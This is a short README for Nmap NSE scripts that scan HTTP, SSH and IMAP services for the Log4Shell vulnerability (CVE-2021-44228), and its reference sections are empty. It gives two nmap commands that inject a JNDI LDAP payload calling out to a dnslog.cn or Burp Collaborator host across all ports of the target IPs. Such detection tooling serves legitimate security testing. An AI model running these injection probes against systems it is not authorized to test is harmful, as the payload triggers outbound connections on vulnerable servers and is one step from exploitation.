# nse-log4shell

Nmap NSE scripts to check against log4shell or LogJam vulnerabilities (CVE-2021-44228).
NSE scripts check most popular exposed services on the Internet. It is basic script where you can customize payload.

###

### By help of dnslog.cn

Go to http://dnslog.cn/ and Get SubDomain. Replace your xxxx with your SubDomain:

```
nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.dnslog.cn}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
```

### By help of burpcollaborator

Take your domain from Burp collaborator and replace xxxx with your domain:

```
nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.burpcollaborator.net/diverto}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
```

# References

## General

## Detection

## Mitigation

## Fixing


